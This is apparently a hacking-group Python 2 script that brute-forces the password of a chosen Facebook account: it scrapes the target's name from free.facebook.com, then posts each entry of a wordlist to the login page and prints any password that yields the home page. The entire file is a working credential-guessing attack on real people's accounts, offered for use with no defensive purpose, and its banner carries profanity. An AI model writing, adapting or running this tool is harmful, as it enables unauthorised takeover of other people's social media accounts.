try:
 from urllib2 import urlopen
 import requests,sys,string,urllib2
 from bs4 import BeautifulSoup
except ImportError as e:
 print "\033[1;31m [ Install Packages %s ] \033[1;0m "%(e)
 sys.exit()


banner = """
 \033[1;32m [ Author : X14N23N6                     ] \033[1;0m
 \033[1;32m [ Team   : Blackhole Security           ] \033[1;0m
 \033[1;32m [ Script : Python                       ] \033[1;0m
 \033[1;31m [ Alert  : Don't Recode mother fucker ! ] \033[1;0m
 \n
"""

id = ""

def main():
 print banner
 global id
 try:
  s = raw_input("\033[1;32m [ ID ] : \033[1;0m")
  id = s.split()[-1]
  print "\033[1;33m [ Take Target Name ] \033[1;0m"
  ur = "https://free.facebook.com/"+id
  try:
   k = urlopen(ur).read()
   soup = BeautifulSoup(k, "html.parser")
   print "\033[1;33m [ Target Name Is ] : %s \033[1;0m"%soup.find("h3","bi").get_text()
  except urllib2.HTTPError:
   print "\033[1;31m [ 404 Not Found ] \033[1;0m"
   sys.exit()
  except AttributeError:
   print "\033[1;31m [ h3 class='bi' Not Found ! ] \033[1;0m"
   sys.exit()
  print "\033[1;32m [ Starting Bruteforce ] \033[1;0m"
  wo = open("list.txt","r").readlines()
  for word in wo:
   pw = word.strip()
   r = requests.post("https://free.facebook.com/login.php", data={"email":id, "pass":pw, "login":"submit"})
   kon = r.content
   if "Beranda" in kon:
    print "\033[1;32m [ Password Found ! ] : \033[1;0m"
    print "\033[1;33m [ ID ] : \033[1;0m\033[1;32m %s \033[1;0m"%(id)
    print "\033[1;33m [ PASSWORD ] : \033[1;0m \033[1;32m %s \033[1;0m"%(pw)
    sys.exit()
   elif "Home" in kon:
    print "\033[1;32m [ Password Found ! ] : \033[1;0m"
    print "\033[1;33m [ ID ] : \033[1;0m\033[1;32m %s \033[1;0m"%(id)
    print "\033[1;33m [ PASSWORD ] : \033[1;0m \033[1;32m %s \033[1;0m"%(pw)
    sys.exit()
   else:
    print "\033[1;31m [ Password Invalid ! ] : %s \033[1;0m "%(pw)
 except KeyboardInterrupt:
  print "\033[1;31m [ Exiting ] \033[1;0m"
  sys.exit()
 except EOFError:
  print "\033[1;31m [ Exiting ] \033[1;0m"
  sys.exit()
  
  
if __name__ == "__main__":
 try:
  main()
 except IOError:
  print "\033[1;31m [ Please Create Wordlist with name 'list.txt' \033[1;0m"
  sys.exit()